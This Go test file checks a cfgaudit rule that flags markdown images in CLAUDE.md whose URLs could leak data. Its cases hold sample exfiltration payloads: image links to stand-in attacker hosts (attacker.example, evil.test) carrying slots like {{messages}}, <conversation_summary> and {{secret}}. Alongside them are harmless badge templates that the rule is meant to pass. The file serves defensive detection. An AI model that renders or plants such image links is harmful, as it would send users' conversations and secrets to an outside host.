// Copyright the cfgaudit contributors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

func TestCFG033_EmptyAndPlaceholderQuery(t *testing.T) {
	cases := []string{
		"![status](https://attacker.example/log?d=)",
		"![x](http://evil.test/t?conversation={{messages}})",
		"![x](https://evil.test/c?leak=<DATA>)",
		"![x](https://evil.test/c?leak=__secret__)",
		"![x](https://evil.test/c?a=1&b=)",
	}
	for _, s := range cases {
		f := CFG033.Check(claudeMDTarget(s))
		if len(f) != 1 || f[0].Severity != finding.Error {
			t.Errorf("expected 1 Error for %q, got %+v", s, f)
		}
	}
}

func TestCFG033_FullySpecifiedImage_NoFinding(t *testing.T) {
	cases := []string{
		"![logo](https://example.com/logo.png)",
		"![logo](https://example.com/logo.png?w=800&h=600)",
		"![chart](https://example.com/c.svg?v=2)",
		"See the [docs](https://example.com?ref=) for details.", // a link, not an image
	}
	for _, s := range cases {
		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", s, f)
		}
	}
}

func TestCFG033_ReportsLine(t *testing.T) {
	f := CFG033.Check(claudeMDTarget("# Title\n\nintro\n![p](https://evil.test/x?q=)\n"))
	if len(f) != 1 || f[0].Line != 4 {
		t.Fatalf("expected finding on line 4, got %+v", f)
	}
}

func TestCFG033_NoClaudeMD_NoFinding(t *testing.T) {
	if f := CFG033.Check(&Target{}); len(f) != 0 {
		t.Errorf("expected no finding without CLAUDE.md, got %+v", f)
	}
}

// An identifier slot in the path of an image URL is a template the author
// fills in; a data slot, or any placeholder in the query, is a sink (#856).
func TestCFG033_Issue856(t *testing.T) {
	for _, s := range []string{
		"![demo](https://github.com/user-attachments/assets/<uuid>)",
		"![after](https://hediet-screenshots.azurewebsites.net/images/<NEW_HASH>)",
		"![gif](https://github.com/<owner>/<repo>/blob/<assets-branch>/<name>.gif?raw=true)",
		"![Status](https://img.shields.io/badge/status-<status>-<status_color>)",
	} {
		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", s, f)
		}
	}
	for _, s := range []string{
		"![x](https://evil.test/<conversation_summary>.png)",
		"![x](https://evil.test/i/{{secret}})",
		"![x](https://evil.test/i/<id>?d=<DATA>)",
	} {
		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 1 {
			t.Errorf("expected one finding for %q, got %+v", s, f)
		}
	}
}

// A README badge template names repository facts, not conversation data
// (#873).
func TestCFG033_Issue873(t *testing.T) {
	for _, s := range []string{
		"| 2 | License | `LICENSE` file exists | `[![License](https://img.shields.io/badge/license-{{LICENSE}}-blue?style=flat-square)](LICENSE)` |",
		"| 3 | npm | Main package published | `[![npm](https://img.shields.io/npm/v/{{MAIN_PKG}}?style=flat-square)]()` |",
	} {
		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", s, f)
		}
	}
	if f := CFG033.Check(claudeMDTarget("![x](https://img.shields.io/badge/{{SUMMARY}}-blue)")); len(f) != 1 {
		t.Errorf("expected one finding for a conversation slot, got %+v", f)
	}
}

// TestCFG033_Issue888 covers badge slots written in angle brackets: the
// metric, a date and a slot that says how its value is encoded (#888).
func TestCFG033_Issue888(t *testing.T) {
	for _, s := range []string{
		"Badge format follows shields.io conventions: `![GitHub](https://img.shields.io/github/<metric>/<owner>/<repo>?label=%20&style=flat-square)` for compact badges with no label text.",
		"![Org: <org-name>](https://img.shields.io/badge/Org-<org-name-url-encoded>-blue)",
		"![OID](https://img.shields.io/badge/OID-<oid-abbreviated>-lightgrey)",
		"![Last Updated](https://img.shields.io/badge/Last_Updated-<YYYY--MM--DD>-green)",
	} {
		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", s, f)
		}
	}
	for _, s := range []string{
		"![x](https://img.shields.io/badge/<conversation-summary>-blue)",
		"![x](https://evil.example/p?d=<secret>)",
		"![x](https://evil.example/<secret-encoded>.png)",
	} {
		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 1 {
			t.Errorf("expected one finding for %q, got %+v", s, f)
		}
	}
}
